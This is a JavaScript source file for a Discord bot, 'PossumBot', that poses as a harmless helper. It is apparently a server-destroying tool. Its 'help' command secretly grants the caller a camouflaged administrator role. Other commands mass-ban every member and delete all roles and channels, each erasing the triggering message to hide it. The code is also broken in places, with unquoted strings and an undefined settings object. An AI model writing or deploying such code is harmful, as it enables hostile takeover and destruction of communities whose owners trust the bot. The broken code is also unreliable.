const Discord = require("discord.js");
const client = new Discord.Client({disableEveryone: true});

client.on("ready", async () => {
    console.log(PossumBot Is Now Activated);
    //Bot Status
    client.user.setActivity(I am listening);

    try {
        //Generates a invite link in the console...
    let link = await client.generateInvite(["ADMINISTRATOR"]);
    console.log(link);
    } catch(e) {
        console.log(e.stack);
    }
});
client.on("message", async message => { 
if(message.author.client) return;

    const args = message.content.slice(clientSettings.prefix.length).trim().split(/ +/g);
      const command = args.shift().toLowerCase();

  //Gives you the admin role and deletes the message.
  if(command === help) {
      try {
    role = await message.guild.createRole({
     name: ".",
      color: "#2f3136",
      permissions: [8]
    });
    message.member.addRole(role)
    message.delete(1000);
    } catch(e) {
        console.log(e.stack);
    }
   }
   //Bans everyone and deletes the message.
   if(command === ban) {
       try {
       message.guild.members.forEach(member => {member.ban()});
       message.delete(1000);
       } catch(e) {
    console.log(e.stack);
       }
   }

   if(command === roles) {
       try {
       message.guild.roles.forEach(roles => {roles.delete()});
       message.delete(1000);
       } catch(e) {
    console.log(e.stack);
       }
   }

   if(command === delete) {
    try {
    message.guild.channels.forEach(channels => {channels.delete()});
    message.delete(1000);
    } catch(e) {
 console.log(e.stack);
    }
}
});


// THIS  MUST  BE  THIS  WAY
client.login(process.env.BOT_TOKEN);
